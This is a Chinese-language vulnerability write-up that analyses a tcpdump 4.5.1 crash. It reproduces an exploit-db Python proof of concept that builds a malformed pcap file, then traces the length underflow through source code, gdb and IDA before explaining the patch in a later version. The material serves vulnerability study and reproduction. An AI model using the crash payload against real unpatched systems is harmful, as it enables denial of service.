> 原文链接: https://www.anquanke.com//post/id/166711 


# tcpdump 4.5.1 crash 深入分析


                                阅读量   
                                **200879**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t010764e28d1b48515e.png)](https://p3.ssl.qhimg.com/t010764e28d1b48515e.png)

在看[WHEREISK0SHL](https://whereisk0shl.top/post/2016-10-23-1)大牛的博客，其分析了`tcpdump4.5.1 crash` 的原因。跟着做了一下，发现他的可执行程序是经过`stripped`的，而且整个过程看的比较懵，所以自己重新实现了一下，并从源码的角度分析了该`crash`形成的原因。

## 构建环境

```
kali 2.0
apt install gcc gdb libpcap-dev -y
wget https://www.exploit-db.com/apps/973a2513d0076e34aa9da7e15ed98e1b-tcpdump-4.5.1.tar.gz
./configure
make
```

未修复版本

```
root@kali32:~# tcpdump --version
tcpdump version 4.5.1
libpcap version 1.8.1
```

payload(来自exploit-db)

```
# Exploit Title: tcpdump 4.5.1 Access Violation Crash
# Date: 31st May 2016
# Exploit Author: David Silveiro
# Vendor Homepage: http://www.tcpdump.org
# Software Link: http://www.tcpdump.org/release/tcpdump-4.5.1.tar.gz
# Version: 4.5.1
# Tested on: Ubuntu 14 LTS

from subprocess import call
from shlex import split
from time import sleep

def crash():
    command = 'tcpdump -r crash'

    buffer     =   'xd4xc3xb2xa1x02x00x04x00x00x00x00xf5xff'
    buffer     +=  'x00x00x00Ix00x00x00xe6x00x00x00x00x80x00'
    buffer     +=  'x00x00x00x00x00x08x00x00x00x00&lt;x9c7@xffx00'
    buffer     +=  'x06xa0rx7fx00x00x01x7fx00x00xecx00x01xe0x1a'
    buffer     +=  "x00x17g+++++++x85xc9x03x00x00x00x10xa0&amp;x80x18'"
    buffer     +=  "xfe$x00x01x00x00@x0cx04x02x08n', 'x00x00x00x00"
    buffer     +=  'x00x00x00x00x01x03x03x04'


    with open('crash', 'w+b') as file:
        file.write(buffer)
    try:
        call(split(command))
        print("Exploit successful!             ")
    except:
        print("Error: Something has gone wrong!")


def main():

    print("Author:   David Silveiro                           ")
    print("   tcpdump version 4.5.1 Access Violation Crash    ")

    sleep(2)
    crash()

if __name__ == "__main__":
    main()
```

执行效果

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1542711906438.png)

执行顺序

```
print_packet
 |
 |--&gt;ieee802_15_4_if_print
        |
        |--&gt;hex_and_asciii_print(ndo_default_print)
                |
                |--&gt;hex_and_ascii_print_with_offset
```

直接顺着源代码撸就行

```
&gt; git clone https://github.com/the-tcpdump-group/tcpdump
&gt; git tag
    ...
      tcpdump-4.4.0
    tcpdump-4.5.0
    tcpdump-4.5.1
    tcpdump-4.6.0
    tcpdump-4.6.0-bp
    tcpdump-4.6.1
    tcpdump-4.7.0-bp
    tcpdump-4.7.2
    ...
&gt; git checkout tcpdump-4.5.1
```

`tcpdump.c`找到`pcap_loop`调用

```
do `{`
        status = pcap_loop(pd, cnt, callback, pcap_userdata);
        if (WFileName == NULL) `{`
            /*
             * We're printing packets.  Flush the printed output,
             * so it doesn't get intermingled with error output.
             */
            if (status == -2) `{`
                /*
                 * We got interrupted, so perhaps we didn't
                 * manage to finish a line we were printing.
                 * Print an extra newline, just in case.
                 */
                putchar('n');
            `}`
            (void)fflush(stdout);
        `}`
```

问题出在调用`pcap_loop`的`callback`函数中。根据源码`callback`函数指向

```
callback = print_packet;
```

函数`print_packet`

```
static void
print_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *sp)
`{`
    struct print_info *print_info;
    u_int hdrlen;

    ++packets_captured;

    ++infodelay;
    ts_print(&amp;h-&gt;ts);

    print_info = (struct print_info *)user;

    /*
     * Some printers want to check that they're not walking off the
     * end of the packet.
     * Rather than pass it all the way down, we set this global.
     */
    snapend = sp + h-&gt;caplen;

        if(print_info-&gt;ndo_type) `{`
                hdrlen = (*print_info-&gt;p.ndo_printer)(print_info-&gt;ndo, h, sp);&lt;====
        `}` else `{`
                hdrlen = (*print_info-&gt;p.printer)(h, sp);
        `}`
    ...
    putchar('n');

    --infodelay;
    if (infoprint)
        info(0);
`}`
```

其中`(*print_info-&gt;p.ndo_printer)(print_info-&gt;ndo, h, sp)`指向`ieee802_15_4_if_print`

[![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543285169700.png)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543285169700.png)

函数`ieee802_15_4_if_print`

```
u_int
ieee802_15_4_if_print(struct netdissect_options *ndo,
                      const struct pcap_pkthdr *h, const u_char *p)
`{`
    u_int caplen = h-&gt;caplen;
    int hdrlen;
    u_int16_t fc;
    u_int8_t seq;

    if (caplen &lt; 3) `{`
        ND_PRINT((ndo, "[|802.15.4] %x", caplen));
        return caplen;
    `}`

    fc = EXTRACT_LE_16BITS(p);
    hdrlen = extract_header_length(fc);

    seq = EXTRACT_LE_8BITS(p + 2);

    p += 3;
    caplen -= 3;

    ND_PRINT((ndo,"IEEE 802.15.4 %s packet ", ftypes[fc &amp; 0x7]));
    if (vflag)
        ND_PRINT((ndo,"seq %02x ", seq));
    if (hdrlen == -1) `{`
        ND_PRINT((ndo,"malformed! "));
        return caplen;
    `}`

    if (!vflag) `{`
        p+= hdrlen;
        caplen -= hdrlen;     &lt;====== 引起错误位置
    `}` else `{`
        ...
        caplen -= hdrlen;
    `}`

    if (!suppress_default_print)
        (ndo-&gt;ndo_default_print)(ndo, p, caplen);

    return 0;
`}`
```

跟踪进入

[![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543288222918.png)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543288222918.png)

> `libpcap`在处理不正常包时不严谨，导致包的头长度`hdrlen`竟然大于捕获包长度`caplen`，并且在处理时又没有相关的判断，这里后续再翻看一下源码。

`hdrlen`和`caplen`都是非负整数，导致`caplen==0xfffffff3`过长。继续跟进`hex_and_asciii_print(ndo_default_print)`

```
void
hex_and_ascii_print(register const char *ident, register const u_char *cp,
    register u_int length)
`{`
    hex_and_ascii_print_with_offset(ident, cp, length, 0);
`}`
```

其中`length==0xfffffff3`继续

```
void
hex_print_with_offset(register const char *ident, register const u_char *cp, register u_int length,
              register u_int oset)
`{`
    register u_int i, s;
    register int nshorts;

    nshorts = (u_int) length / sizeof(u_short);
    i = 0;
    while (--nshorts &gt;= 0) `{`
        if ((i++ % 8) == 0) `{`
            (void)printf("%s0x%04x: ", ident, oset);
            oset += HEXDUMP_BYTES_PER_LINE;
        `}`
        s = *cp++;   &lt;======= 抛出错误位置
        (void)printf(" %02x%02x", s, *cp++);
    `}`
    if (length &amp; 1) `{`
        if ((i % 8) == 0)
            (void)printf("%s0x%04x: ", ident, oset);
        (void)printf(" %02x", *cp);
    `}`
`}`
```

`nshorts=(u_int) length / sizeof(u_short)` =&gt; `nshorts=0xfffffff3/2=‭7FFFFFF9‬`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543289390163.png)

但数据包数据没有这么长，导致了`crash`。感觉这个bug跟`libpcap`和`tcpdump`都有关系，再来看看修复情况。



## 修复测试

修复版本

```
root@kali32:~# tcpdump --version
tcpdump version 4.7.0-PRE-GIT_2018_11_19
libpcap version 1.8.1
```

`libpcap`依然是`apt`安装的默认版本，`tcpdump`使用`4.7 .0-bp`版本

```
git checkout tcpdump-4.7.0-bp
```

测试一下

```
gdb-peda$ run -r crash
Starting program: /usr/local/sbin/tcpdump -r crash
reading from file crash, link-type IEEE802_15_4_NOFCS (IEEE 802.15.4 without FCS)
04:06:08.000000 IEEE 802.15.4 Beacon packet 
tcpdump: pcap_loop: invalid packet capture length 385882848, bigger than maximum of 262144
[Inferior 1 (process 8997) exited with code 01]
```

在`pcap_loop`中发现数据包长度过长，发生了错误并输出错误提示。

这里有一个比较难理解的地方，两个测试版本`libpcap`是相同的，那么对应的`pcap_loop`也就是一样的，为什么一个版本`pcap_loop`出错了，而另一个则没有。为了找到这出这个疑问，我连续用了一周的时间去测试。

依然顺着这个结构走一遍

```
print_packet
 |
 |--&gt;ieee802_15_4_if_print
        |
        |--&gt;hex_and_asciii_print(ndo_default_print)
                |
                |--&gt;hex_and_ascii_print_with_offset
```

比较`print_packet`两个版本的区别

[![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543284168411.png)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543284168411.png)

`snapend`原本是利用一个变量存放，这里存放在了结构体`ndo`里，表示数据包最后一个数据位置。

跟进`ieee802_15_4_if_print`，首先看一下版本比较

[![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543297727522.png)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543297727522.png)

可以看到没有比较大的变化，主要就是将一些标志位放在了`ndo`结构体中。

执行结果

[![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543297947132.png)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543297947132.png)

可以看到目前的结果和`4.5.1`版本中是一样的。

继续跟进`hex_and_ascii_print_with_offset`，首先查看一下版本比较

[![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543306088706.png)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543306088706.png)

代码一开始就增加了一个`caplength`的判断

```
caplength = (ndo-&gt;ndo_snapend &gt;= cp) ? ndo-&gt;ndo_snapend - cp : 0;
if (length &gt; caplength)
    length = caplength;
nshorts = length / sizeof(u_short);
i = 0;
hsp = hexstuff; asp = asciistuff;
while (--nshorts &gt;= 0) `{`
    ...
`}`
```

增加了这个判断，即可修复该错误。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543306755958.png)

可以看到执行完`caplength = (ndo-&gt;ndo_snapend &gt;= cp) ? ndo-&gt;ndo_snapend - cp : 0;`，`caplength`为0，继续执行，可以推出`length`同样为0，到这里已经不会发生错误了。



## 跟踪错误输出

其实细心一点，还可以发现修复完后，会输出不一样的处理信息

```
reading from file crash, link-type IEEE802_15_4_NOFCS (IEEE 802.15.4 without FCS)
04:06:08.000000 IEEE 802.15.4 Beacon packet 
tcpdump: pcap_loop: invalid packet capture length 385882848, bigger than maximum of 262144
[Inferior 1 (process 8997) exited with code 01]
```

该错误信息是通过`pcap_loop`输出的，在`libpcap`定位一下该错误处理，可以发现其在`pcap_next_packet`函数中

```
static int
pcap_next_packet(pcap_t *p, struct pcap_pkthdr *hdr, u_char **data)
`{`
    ...
    if (hdr-&gt;caplen &gt; p-&gt;bufsize) `{`
        /*
         * This can happen due to Solaris 2.3 systems tripping
         * over the BUFMOD problem and not setting the snapshot
         * correctly in the savefile header.
         * This can also happen with a corrupted savefile or a
         * savefile built/modified by a fuzz tester.
         * If the caplen isn't grossly wrong, try to salvage.
         */
        size_t bytes_to_discard;
        size_t bytes_to_read, bytes_read;
        char discard_buf[4096];

        if (hdr-&gt;caplen &gt; MAXIMUM_SNAPLEN) `{`    &lt;===== 判断是否超过最大值
            pcap_snprintf(p-&gt;errbuf, PCAP_ERRBUF_SIZE,
                "invalid packet capture length %u, bigger than "
                "maximum of %u", hdr-&gt;caplen, MAXIMUM_SNAPLEN);
            return (-1);
        `}`
        ...
```

还是那个问题，都是同样的`libpcap`版本，`4.7.0`输出的是`pcap_next_packet`中的错误信息，但是`4.5.1`却直接访问异常了？

经过不停的测试，我是这么理解的：

`4.7.0`中对长度进行了判断，导致不合规的`length`没有被处理，从而导致`pcap_loop`中又重新进行了一次`pcap_next_packet`

```
pcap_loop
  |
  |--&gt; pcap_next_packet =&gt; 第一次在hex_and_ascii_print_with_offset中length为0
         |
         |--&gt; pcap_next_packet =&gt; 第二次hdr-&gt;caplen &gt; MAXIMUM_SNAPLEN
```

执行测试

确定IDA映射地址

[![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543319602789.png)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543319602789.png)

`pcap_loop`函数会调用`pcap_read_offline`(具体可查看`libpcap`源码)，在`pcap_read_offline`函数中

```
.text:B7F99BC7                 push    edi
.text:B7F99BC8                 push    [esp+58h+var_40]
.text:B7F99BCC                 mov     eax, [esp+5Ch+var_44]
.text:B7F99BD0                 call    eax             ; callback(调用print_packet)
.text:B7F99BD2                 add     esp, 10h
            ...
.text:B7F99BED                 push    [esp+50h+var_48]
.text:B7F99BF1                 push    edi
.text:B7F99BF2                 push    ebp
.text:B7F99BF3                 call    dword ptr [ebp+4] ; 调用pcap_next_packet
.text:B7F99BF6                 add     esp, 10h
.text:B7F99BF9                 test    eax, eax
.text:B7F99BFB                 jnz     short loc_B7F99C30
.text:B7F99BFD                 mov     edx, [ebp+8Ch]
.text:B7F99C03                 mov     eax, [esp+4Ch+var_34]
.text:B7F99C07                 test    edx, edx
.text:B7F99C09                 jz      short loc_B7F99BC0
.text:B7F99C0B                 push    [esp+4Ch+var_28] ; u_int
.text:B7F99C0F                 push    [esp+50h+var_24] ; u_int
.text:B7F99C13                 push    eax             ; u_char *
.text:B7F99C14                 push    edx             ; struct bpf_insn *
.text:B7F99C15                 call    _bpf_filter
```

比较重要的函数有`callback`和`pcap_next_packet`，在`pcap_next_packet`设置断点

第一次到断点

[![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543320519522.png)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543320519522.png)

执行查看返回值

[![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543320662783.png)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543320662783.png)

对照ida

[![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543320704084.png)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543320704084.png)

可以看到返回0，会执行一遍`callback`，即打印函数。之后会因为`length=0`结束

第二次`pcap_next_packet`

[![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543321043409.png)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543321043409.png)

跟进去 以确定`caplen`具体的值，并确认判断条件(这里无论是分析`libpcap`源码，还是ida伪码都可以)，查看ida伪码

```
signed int __cdecl pcap_next_packet_B7F9A050(int a1, unsigned int *a2, _DWORD *a3)
`{`

  ...

  unsigned int v33; // [esp+Ch] [ebp-1040h]
  unsigned int v34; // [esp+14h] [ebp-1038h]
  unsigned int v35; // [esp+18h] [ebp-1034h]
  size_t n; // [esp+1Ch] [ebp-1030h]
  unsigned int v37; // [esp+20h] [ebp-102Ch]
  char ptr; // [esp+2Ch] [ebp-1020h]
  unsigned int v39; // [esp+102Ch] [ebp-20h]

  v3 = a2;
  v4 = *(a1 + 36);
  v5 = *(a1 + 44);
  v39 = __readgsdword(0x14u);
  stream = v5;
  /*
   v34是一个结构体
   str_v34 `{`
       u_int_t v34;
       u_int_t v35;
       size_t n; // caplen
       u_int_t v37;
   `}`
  */
  v6 = __fread_chk(&amp;v34, 24, 1, *v4, v5); //这里下断点查看n的值
  if ( *v4 == v6 )
  `{`
    caplen = n;
    v8 = v37;
    v9 = v35;
    v33 = v34;
    if ( *(a1 + 40) )
    `{`
      caplen = _byteswap_ulong(n); 
      v21 = _byteswap_ulong(v37);
      v22 = _byteswap_ulong(v35);
      a2[2] = caplen;
      a2[3] = v21;
      a2[1] = v22;
      *a2 = _byteswap_ulong(v33);
      v10 = v4[2];
      if ( v10 != 1 )
      `{`
LABEL_4:
        if ( v10 == 2 )
          a2[1] = a2[1] / 1000;
        v11 = v4[1];
        if ( v11 != 1 )
        `{`
LABEL_7:
          if ( v11 != 2 || (v23 = a2[3], v23 &gt;= caplen) )
          `{`
LABEL_8:
            bufsize = *(a1 + 16);
            if ( bufsize &gt;= caplen )
            `{`
              if ( a2[2] == fread(*(a1 + 20), 1u, caplen, stream) )
              `{`
LABEL_30:
                v26 = *(a1 + 20);
                result = *(a1 + 40);
                *a3 = v26;
                if ( result )
                `{`
                  sub_B7F9C580(*(a1 + 68), v3, v26);
                  result = 0;
                `}`
                goto LABEL_27;
              `}`
              v27 = a1 + 144;
              if ( ferror(stream) )
              `{`
                v28 = __errno_location();
                v29 = pcap_strerror(*v28);
                __snprintf_chk(v27, 256, 1, 257, "error reading dump file: %s", v29);
              `}`
              else
              `{`
                __snprintf_chk(
                  v27,
                  256,
                  1,
                  257,
                  "truncated dump file; tried to read %u captured bytes, only got %lu",
                  a2[2]);
              `}`
            `}`
            else if ( caplen &gt; 0x40000 ) // 下断点，执行判断
            `{`
              __snprintf_chk(
                a1 + 144,
                256,
                1,
                257,
                "invalid packet capture length %u, bigger than maximum of %u",
                caplen);
            `}`
     ...
```

查看`n`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543325099490.png)

在比较处下断点，测试是否大于最大值`0x40000`

[![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543325185664.png)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543325185664.png)

大于最大值，会将错误信息返回`pcap_loop`

[![](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543325248324.png)](https://raw.githubusercontent.com/xinali/img/master/blog/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/tcpdump-4.5.1%20crash%E5%88%86%E6%9E%90/1543325248324.png)

至此整个过程分析完毕，包括具体的出错原因，修补代码都做了详细分析



## 参考

[exploit-db payload](https://www.exploit-db.com/exploits/39875/)

[WHEREISK0SHL分析博客](https://whereisk0shl.top/post/2016-10-23-1)

[libpcap/tcpdump源码](https://github.com/the-tcpdump-group)
